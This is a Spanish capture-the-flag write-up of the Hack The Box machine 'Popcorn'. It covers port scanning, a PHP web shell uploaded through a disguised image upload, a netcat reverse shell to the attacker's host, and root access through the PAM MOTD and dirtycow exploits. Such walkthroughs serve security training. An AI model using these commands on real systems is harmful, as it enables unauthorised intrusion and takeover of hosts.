---
title: Hack The Box Popcorn
author: k4miyo
date: 2022-01-16
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Linux]
tags: [PHP, Web]
ping: true
---

## Popcorn
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección 10.10.10.6.

```bash
❯ ping -c 1 10.10.10.6
PING 10.10.10.6 (10.10.10.6) 56(84) bytes of data.
64 bytes from 10.10.10.6: icmp_seq=1 ttl=63 time=138 ms

--- 10.10.10.6 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 137.631/137.631/137.631/0.000 ms|
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.6 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-16 15:55 CST
Initiating Ping Scan at 15:55
Scanning 10.10.10.6 [4 ports]
Completed Ping Scan at 15:55, 0.17s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:55
Scanning 10.10.10.6 [65535 ports]
Discovered open port 22/tcp on 10.10.10.6
Discovered open port 80/tcp on 10.10.10.6
SYN Stealth Scan Timing: About 42.42% done; ETC: 15:56 (0:00:42 remaining)
Completed SYN Stealth Scan at 15:56, 64.11s elapsed (65535 total ports)
Nmap scan report for 10.10.10.6
Host is up (0.22s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 64.40 seconds
           Raw packets sent: 66039 (2.906MB) | Rcvd: 66036 (2.641MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.6
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80 10.10.10.6 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-16 15:58 CST
Nmap scan report for 10.10.10.6
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.12 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.84 seconds
```

Como vemos el puerto 80 abierto, vamos a ver a lo que nos enfrentamos con `whatweb`:

```bash
❯ whatweb http://10.10.10.6/
http://10.10.10.6/ [200 OK] Apache[2.2.12], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.12 (Ubuntu)], IP[10.10.10.6]
```

Vemos que se trata de la página default de Apache, que es lo que vemos vía web.

![](/assets/images/htb-popcorn/popcorn-web.png)

No vemos nada interesante, asi que vamos a buscar recursos dentro del servidor web y vamos a empezar con `nmap` antes de tirar de otra herramienta tocha.

```bash
❯ nmap --script http-enum -p80 10.10.10.6
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-16 16:02 CST
Nmap scan report for 10.10.10.6
Host is up (0.14s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /test/: Test page
|   /test.php: Test page
|   /test/logon.html: Jetty
|_  /icons/: Potentially interesting folder w/ directory listing

Nmap done: 1 IP address (1 host up) scanned in 37.37 seconds
```

Vamos a echarles un ojo:

![](/assets/images/htb-popcorn/popcorn-web1.png)

![](/assets/images/htb-popcorn/popcorn-web2.png)

Algo que podemos observar son los **HTTP Headers Information** y en específico el **User-Agent** que nos aparece los datos de nuestro navegador **Mozilla/5.0 (X11; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0**.

![](/assets/images/htb-popcorn/popcorn-web3.png)

Vamos a tratar de cambiarlo mediante el uso de `curl`:

```bash
❯ curl -s "http://10.10.10.6/test/" | grep "User-Agent"
<tr><td class="e">User-Agent </td><td class="v">curl/7.74.0 </td></tr>
❯ curl -s "http://10.10.10.6/test/" -H "User-Agent: k4miyo" | grep "User-Agent"
<tr><td class="e">User-Agent </td><td class="v">k4miyo </td></tr>
```

Ahora debemos buscar una forma de ejecutar comandos a nivel de sistema aprovechando el campo **User-Agent**; sin embargo, no obtenemos nada. Por lo tanto, vamos a hacer uso de la herramienta `wfuzz` para obtener recursos dentro del servidor web:

```bash
❯ wfuzz -c -L -t 300 --hc=404 --hh=177 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.6/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.6/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000611:   200        656 L    3119 W     47507 Ch    "test"                                                          
000004023:   200        293 L    882 W      11356 Ch    "torrent"                                                       
000006953:   404        9 L      32 W       278 Ch      "1095"                                                          

Total time: 44.90012
Processed Requests: 6722
Filtered Requests: 6720
Requests/sec.: 149.7100
```

Tenemos el recurso `/torrent/`, así que vamos a echarle un ojo.

![](/assets/images/htb-popcorn/popcorn-web4.png)

Si analizamos un poco el sitio, vemos que tenemos la capacidad de registrarnos, así que eso haremos.

![](/assets/images/htb-popcorn/popcorn-web5.png)

![](/assets/images/htb-popcorn/popcorn-web6.png)

Si ponemos ojo de lince, tenemos la capacidad de subir archivos y por el nombre del recurso, lo más seguro es que sea un torrent; asi que vamos a descargar un archivo el que queramos; para este caso sería de [Parrot OS](https://www.parrotsec.org/security-edition/)

![](/assets/images/htb-popcorn/popcorn-web7.png)

![](/assets/images/htb-popcorn/popcorn-web8.png)

Si nos percatamos, en la parte de abajo, vemos que tenemos la posiblidad de subir una imagen; pero si en vez de una imagen subimos un archivo php, nos indica **Invalid file**. Por lo tanto, vamos a tratar de subir una imagen de verdad y vamos a hacer uso de **BurpSuite** en donde modificamos el contenido del archivo a nuestra sentencia php de siempre y también modificamos el nombre del archivo a **shell.php.

![](/assets/images/htb-popcorn/popcorn-burp.png)

Vemos que se ha subido de forma exitosa; asi que vamos a ver en donde podría estar el archivo que subimos. Si hacemos *hovering* sobre la imagen que subimos (para este caso nos aparece **Image File Not Found!**), vemos que nos aparece la ruta `upload` y despúes un nombre random con terminación php, ese es nuestro archivo, así que vamos a abrirlo en una segunda ventana para ejecutar comandos a nivel de sistema.

![](/assets/images/htb-popcorn/popcorn-web9.png)

![](/assets/images/htb-popcorn/popcorn-web10.png)

Ahora como siempre, nos ponemos en escucha por el puerto 443 y procedemos a entablarnos una reverse shell.

```bash
http://10.10.10.6/torrent/upload/8808ea0b7cf49a6fb69bcdb20aeac84a4fd9974f.php?cmd=nc 
 -e /bin/bash 10.10.14.27 443 &
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.6] 34180
whoami
www-data
```

Para trabajar más cómodos, vamos a hacer un [Tratamiento de la tty](/posts/tratamiento-tty). Ya nos encontramos dentro de la máquina y podemos visuailzar la flag (user.txt). Ahora necesitamos enumerar un poco el sistema para encontrar un forma de escalar privilegios.

```bash
www-data@popcorn:/home$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@popcorn:/home$ sudo -l
[sudo] password for www-data: 
www-data@popcorn:/home$ find \-type f
./george/.bash_logout
./george/.bashrc
./george/torrenthoster.zip
./george/.cache/motd.legal-displayed
./george/.sudo_as_admin_successful
./george/user.txt
./george/.nano_history
./george/.mysql_history
./george/.profile
www-data@popcorn:/home$
```

Aquí ya vemos algo que nos llama la atención, que es el recurso `/george/.cache/motd.legal-displayed`; que si buscamos un poco, vamos a encontrar un posible exploit a utilizar.

```bash
❯ searchsploit motd
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (1)             | linux/local/14273.sh
Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)             | linux/local/14339.sh
MultiTheftAuto 0.5 patch 1 - Server Crash / MOTD Deletion                                      | windows/dos/1235.c
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Nos indica que aplica para **Linux PAM 1.1.0**, vamos a corroborarlo:

```bash
www-data@popcorn:/home$ dpkg -l | grep pam
ii  libpam-modules                      1.1.0-2ubuntu1                    Pluggable Authentication Modules for PAM
ii  libpam-runtime                      1.1.0-2ubuntu1                    Runtime support for the PAM library
ii  libpam0g                            1.1.0-2ubuntu1                    Pluggable Authentication Modules library
ii  python-pam                          0.4.2-12ubuntu3                   A Python interface to the PAM library
www-data@popcorn:/home$
```

Vemos que si podría aplicar, así que nos descargamos el exploit, lo copiamos en una ruta donde tengamos permisos y lo ejecutamos.

```bash
❯ searchsploit -m linux/local/14339.sh
  Exploit: Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)
      URL: https://www.exploit-db.com/exploits/14339
     Path: /usr/share/exploitdb/exploits/linux/local/14339.sh
File Type: Bourne-Again shell script, ASCII text executable

Copied to: /home/k4miyo/Documentos/HTB/Popcorn/exploits/14339.sh


❯ mv 14339.sh privesc_motd.sh
```

Para evitar algún problema, vamos a pasarlo a formato Unix.

```bash
❯ dos2unix privesc_motd.sh
dos2unix: convirtiendo archivo privesc_motd.sh a formato Unix...
```

Copiamos el contenido con `xclip` y nos creamos un archivo en la máquina víctima bajo la ruta `/dev/shm`:

```bash
❯ cat privesc_motd.sh | xclip -sel clip
```

```bash
www-data@popcorn:/home$ cd /dev/shm
www-data@popcorn:/home$ touch privesc.sh
www-data@popcorn:/home$ chmod +x privesc.sh
www-data@popcorn:/dev/shm$ nano privesc.sh 
www-data@popcorn:/dev/shm$ ls -l
total 4
-rw-r--r-- 1 www-data www-data 3043 Jan 17 02:30 privesc.sh
www-data@popcorn:/dev/shm$
```

Si leemos un poco el exploit, nos dice que el script nos solicitará una contraseña para acceder como el usuario **root** que es **toor**:

```bash
www-data@popcorn:/dev/shm$ ./privesc.sh 
[*] Ubuntu PAM MOTD local root
[*] SSH key set up
[*] spawn ssh
[+] owned: /etc/passwd
[*] spawn ssh
[+] owned: /etc/shadow
[*] SSH key removed
[+] Success! Use password toor to get root
Password: 
root@popcorn:/dev/shm# whoami
root
root@popcorn:/dev/shm#
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).

Otra forma de escalar privilegios en mediante la explotación del kernel ya que es muy vieja:

```bash
root@popcorn:~# uname -a
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
root@popcorn:~# lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 9.10
Release:        9.10
Codename:       karmic
root@popcorn:~#
```

Para este caso utilizaremos el recurso [dirtycow](https://github.com/FireFart/dirtycow), así que primero validamos que la máquima víctima tiene `gcc`:

```bash
www-data@popcorn:/dev/shm$ which gcc
/usr/bin/gcc
www-data@popcorn:/dev/shm$
```

Vemos que si, así que nos copiamos el archivo y lo guardamos en el máquina víctima.

```bash
www-data@popcorn:/dev/shm$ nano dirty.c 
www-data@popcorn:/dev/shm$ ls -l
total 12
-rw-r--r-- 1 www-data www-data 4816 Jan 17 02:44 dirty.c
-rwxr-xr-x 1 www-data www-data 3043 Jan 17 02:30 privesc.sh
www-data@popcorn:/dev/shm$ cat dirty.c | grep gcc
//   gcc -pthread dirty.c -o dirty -lcrypt
www-data@popcorn:/dev/shm$
```

Dentro del mismo script ya nos indica la forma de compilarlo.

```bash
www-data@popcorn:/dev/shm$ ls -l
total 28
-rwxr-xr-x 1 www-data www-data 13603 Jan 17 02:45 dirty
-rw-r--r-- 1 www-data www-data  4816 Jan 17 02:44 dirty.c
-rwxr-xr-x 1 www-data www-data  3043 Jan 17 02:30 privesc.sh
www-data@popcorn:/dev/shm$
```

Al ejecutarlo nos pedirá una contraseña, ingresamos cualquiera, esperamos un rato y despúes hacemos Ctrl + C. El programa lo que hace es modificar el archivo `/etc/passwd` agregando el usuario **firefart** con la contraseña que le indicamos.

```bash
www-data@popcorn:/dev/shm$ ./dirty  
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fic6dC9mK3e6U:0:0:pwned:/root:/bin/bash

mmap: b7737000

^C
www-data@popcorn:/dev/shm$ cat /etc/passwd
firefart:fic6dC9mK3e6U:0:0:pwned:/root:/bin/bash
/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
landscape:x:102:105::/var/lib/landscape:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
george:x:1000:1000:George Papagiannopoulos,,,:/home/george:/bin/bash
mysql:x:104:113:MySQL Server,,,:/var/lib/mysql:/bin/false
www-data@popcorn:/dev/shm$
```

Por lo tanto, migramos al usuario **firefart** con la contraseña que le indicamos:

```bash
www-data@popcorn:/dev/shm$ su firefart
Password: 
firefart@popcorn:/dev/shm# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@popcorn:/dev/shm# 
```

Vemos que dicho usuario se encuentra en el grupo `root`, es como si cambiara el nombre de **root** por **firefart**, conservando todos los privilegios del usuario **root**; por lo tanto, de esta forma podemos visualizar la flag (root.txt).
